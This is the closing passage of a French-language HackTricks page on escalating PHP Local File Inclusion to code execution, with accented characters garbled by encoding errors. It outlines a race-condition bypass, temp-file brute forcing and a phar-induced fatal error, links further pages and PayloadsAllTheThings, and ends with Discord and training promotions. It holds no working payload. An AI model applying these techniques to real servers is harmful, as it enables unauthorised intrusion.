Si vous avez trouv√© une **Local File Inclusion** et que vous **pouvez exfiltrer le chemin** du fichier temporaire MAIS que le **serveur** **v√©rifie** si le **fichier √† inclure contient des marques PHP**, vous pouvez essayer de **contourner cette v√©rification** avec cette **Condition de Course** :

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via eternal waiting + bruteforce

Si vous pouvez abuser de la LFI pour **t√©l√©charger des fichiers temporaires** et faire en sorte que le serveur **suspende** l'ex√©cution de PHP, vous pourriez alors **forcer brutalement les noms de fichiers pendant des heures** pour trouver le fichier temporaire :

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### To Fatal Error

Si vous incluez l'un des fichiers `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Vous devez inclure le m√™me deux fois pour provoquer cette erreur).

**Je ne sais pas comment cela peut √™tre utile, mais cela pourrait l'√™tre.**\
_M√™me si vous provoquez une Erreur Fatale PHP, les fichiers temporaires t√©l√©charg√©s sont supprim√©s._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## R√©f√©rences

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes de bugs !

**Aper√ßus de Hacking**\
Engagez-vous avec du contenu qui plonge dans le frisson et les d√©fis du hacking.

**Actualit√©s Hack en Temps R√©el**\
Restez √† jour avec le monde du hacking en √©volution rapide gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el.

**Derni√®res Annonces**\
Restez inform√© avec les derniers lancements de primes de bugs et les mises √† jour cruciales de la plateforme.

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
